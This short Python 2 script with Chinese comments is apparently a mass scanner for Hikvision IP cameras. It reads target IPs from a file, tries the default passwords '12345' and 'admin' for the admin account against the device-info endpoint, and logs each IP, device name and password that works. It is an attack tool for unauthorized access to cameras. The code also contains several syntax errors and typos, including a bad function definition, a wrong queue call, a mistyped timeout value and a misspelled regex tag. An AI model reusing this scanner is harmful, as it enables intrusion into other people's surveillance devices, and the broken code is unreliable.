# coding=utf-8
import threading
import requests
import Queue
import sys
import re
password = ['12345','admin']#弱口令列表
def Threads();
    threadlist = []
    queue = Queue.queue()
    for ip in open('ip.txt','r')#扫描好的ip
        queue.put(ip.replace('\n',''))
    for x in range(0,10):#线程数
        th = threading.Thread(target=scan_Hikvision,args=(queue,))
	threadlist.append(th)
    for t in threadlist:
        t.start()
def scan_Hikvision(queue):
    while not queue.empty():
        ip = queue.get()
	    for passwd in password:
	        try:
		    print "[*]scan:" + ip
		    r = requests.get(url=("http://%s/PSIA/System/deviceinfo" % ip),auth=('admin',passwd),timeout=q0) #增加了timeout超时
		    if r.status_code==200:
		        deviceName=re.findall(r'<devicceName>(.+?)</deviceName>',r.text)[0]
			f = open('ok.txt','a+')
			f.write(("ip:%s deviceName:%s admin:%s\n" % (ip,deviceName,passwd)))
			f.close()
			break
		except:
		    continue
if __name__ == '__main__':
    print "Running scan_Hikvision ......"
    Threads()